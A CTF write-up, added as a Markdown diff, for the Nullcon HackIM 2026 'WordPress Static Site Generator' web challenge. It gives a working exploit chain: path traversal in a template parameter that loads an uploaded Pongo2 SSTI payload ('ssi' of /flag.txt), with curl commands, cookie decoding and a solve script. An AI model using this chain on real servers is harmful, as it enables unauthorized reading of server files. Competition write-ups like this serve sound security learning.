@@ -1,0 +1,164 @@
+---
+title: 'Nullcon HackIM CTF Goa 2026 - WordPress Static Site Generator'
+description: 'Writeup for WordPress Static Site Generator from Nullcon HackIM CTF 2026. A Web challenge involving Pongo2 SSTI via Path Traversal.'
+date: 2026-02-08
+tags: ['writeup', 'web', 'pongo2', 'ssti', 'path-traversal', 'nullcon']
+authors: ['kudaliar']
+draft: false
+---
+
+**Challenge URL:** http://52.59.124.14:5001/  
+**Category:** Web  
+**Vulnerability:** Path Traversal + Pongo2 Server-Side Template Injection (SSTI)  
+**Flag:** `ENO{PONGO2_T3MPl4T3_1NJ3cT1oN_!s_Fun_To00!}`
+
+---
+
+## Challenge Description
+
+> I wanted to convert my WordPress page into a static website, so I implemented a suitable tool... but can it protect /flag.txt?
+
+The challenge presents a web application that converts WordPress XML exports into static HTML websites using different templates.
+
+---
+
+## Reconnaissance
+
+### Application Overview
+
+The web application has the following functionality:
+
+1. **Upload Endpoint** (`/upload`) - Accepts WordPress XML files
+2. **Generate Endpoint** (`/generate`) - Generates static HTML using a selected template
+3. **Download Endpoint** (`/download/example`) - Downloads example WordPress XML
+
+### Key Observations
+
+1. **Template Engine**: The application uses **Pongo2** (Go templating engine)
+   - Error messages reveal: `"Error loading Pongo2 template from templates/XXX.html"`
+
+2. **Template Path Construction**: 
+   - Template parameter: `template=classic`
+   - Actual path: `templates/classic.html`
+   - The `.html` suffix is automatically appended
+
+3. **Session Management**: 
+   - Sessions are stored in a cookie called `wp-session`
+   - Cookie contains base64-encoded session data including a session ID and uploaded filename
+
+4. **File Storage**:
+   - Uploaded files are stored in `uploads/<session_id>/<filename>.html`
+
+---
+
+## Vulnerability Analysis
+
+### Vulnerability 1: Path Traversal in Template Parameter
+
+The `template` parameter is vulnerable to path traversal:
+
+```
+template=../uploads/<session_id>/exploit
+```
+
+This constructs:
+```
+templates/../uploads/<session_id>/exploit.html
+```
+
+Which resolves to:
+```
+uploads/<session_id>/exploit.html
+```
+
+### Vulnerability 2: Pongo2 SSTI via Uploaded File
+
+If we can make Pongo2 load our uploaded file as a template, we can execute SSTI payloads.
+
+Pongo2 supports the `{% ssi %}` tag (Server-Side Include) which reads and outputs file contents:
+
+```
+{% ssi "/flag.txt" %}
+```
+
+---
+
+## Exploitation
+
+### Step 1: Create Malicious Template
+
+Create a file containing the Pongo2 SSTI payload:
+
+```bash
+echo '{% ssi "/flag.txt" %}' > /tmp/exploit.html
+```
+
+### Step 2: Upload the Malicious File
+
+Upload the file with `.html` extension:
+
+```bash
+curl -s -c /tmp/cookies.txt \
+    -F 'wordpress_xml=@/tmp/exploit.html;filename=exploit.html' \
+    http://52.59.124.14:5001/upload
+```
+
+### Step 3: Extract Session ID
+
+The session ID is embedded in the `wp-session` cookie. Decode it:
+
+```bash
+COOKIE=$(grep wp-session /tmp/cookies.txt | awk '{print $NF}')
+echo "$COOKIE" | tr '_-' '/+' | base64 -d
+```
+
+Output example:
+```
+1770458632|DX8EAQL_gAABEAEQAABr_4AAAgZzdHJpbmcMBAACaWQGc3RyaW5nDCIAIDU2MWQyNmQwMzAwY2NmODIzNjAyYTVlZDQ0ODBlYjgzBnN0cmluZwwPAA11cGxvYWRlZF9maWxlBnN0cmluZwwOAAxleHBsb2l0Lmh0bWw=|...
+```
+
+The session ID is base64-encoded within the middle section (after `DCIAID`). The pattern `IDU2MWQyNmQwMzAwY2NmODIzNjAyYTVlZDQ0ODBlYjgz` decodes to ` 561d26d0300ccf823602a5ed4480eb83`.
+
+**Session ID:** `561d26d0300ccf823602a5ed4480eb83`
+
+### Step 4: Trigger SSTI via Path Traversal
+
+Use path traversal to load the uploaded file as a template:
+
+```bash
+curl -s -b /tmp/cookies.txt -X POST http://52.59.124.14:5001/generate \
+    -d "template=../uploads/561d26d0300ccf823602a5ed4480eb83/exploit"
+```
+
+### Result
+
+The Pongo2 template engine processes `{% ssi "/flag.txt" %}` and outputs:
+
+```
+ENO{PONGO2_T3MPl4T3_1NJ3cT1oN_!s_Fun_To00!}
+```
+
+---
+
+## Solve Script
+
+```bash
+#!/bin/bash
+TARGET="${1:-http://52.59.124.14:5001}"
+
+# Create SSTI payload
+echo '{% ssi "/flag.txt" %}' > /tmp/exploit.html
+
+# Upload malicious template
+curl -s -c /tmp/cookies.txt \
+    -F 'wordpress_xml=@/tmp/exploit.html;filename=exploit.html' \
+    "$TARGET/upload"
+
+# Extract session ID (manual step - decode cookie and find 32-char hex)
+COOKIE=$(grep wp-session /tmp/cookies.txt | awk '{print $NF}')
+echo "Decode this cookie to find session ID:"
+echo "$COOKIE" | tr '_-' '/+' | base64 -d
+echo ""
+echo "Then run:"
+echo "curl -s -b /tmp/cookies.txt -X POST $TARGET/generate -d 'template=../uploads/<SESSION_ID>/exploit'"
+```
